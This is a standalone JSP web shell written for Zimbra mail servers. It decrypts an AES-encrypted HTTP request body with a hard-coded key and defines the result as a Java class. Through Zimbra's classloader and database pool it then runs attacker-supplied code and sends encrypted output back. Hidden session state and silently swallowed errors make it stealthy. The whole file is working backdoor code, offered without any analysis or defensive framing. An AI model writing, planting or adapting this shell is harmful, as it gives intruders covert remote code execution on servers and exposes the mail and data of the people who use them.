<%! String xc = "3c6e0b8a9c15224a";

    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    public static ClassLoader getLoader(){
        Thread[] threads = new Thread[Thread.activeCount()];
        Thread.enumerate(threads);
        for (int i = 0; i < threads.length; i++) {
            Thread thread = threads[i];
            if (thread != null){
                ClassLoader loader =  thread.getContextClassLoader();
                try {
                    loader.loadClass("com.zimbra.cs.db.DbPool").getMethod("getConnection").invoke(null);
                    return loader;
                }catch (Exception e){

                }
            }
        }
        return null;
    }
%><%
    try {
        byte[] data = new byte[Integer.parseInt(request.getHeader("Content-Length"))];
        java.io.InputStream inputStream = request.getInputStream();
        int _num = 0;
        while ((_num += inputStream.read(data, _num, data.length)) < data.length) ;
        data = x(data, false);
        if (session.getAttribute("aVrRt71") == null) {
            session.setAttribute("aVrRt71", new X(getLoader()).Q(data));
        } else {
            Object f = ((Class) session.getAttribute("aVrRt71")).newInstance();
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
            f.equals(data);
            f.equals(arrOut);
            f.equals(request);
            f.toString();
            response.getOutputStream().write(x(arrOut.toByteArray(), true));
        }
    } catch (Exception e) {
    }
%>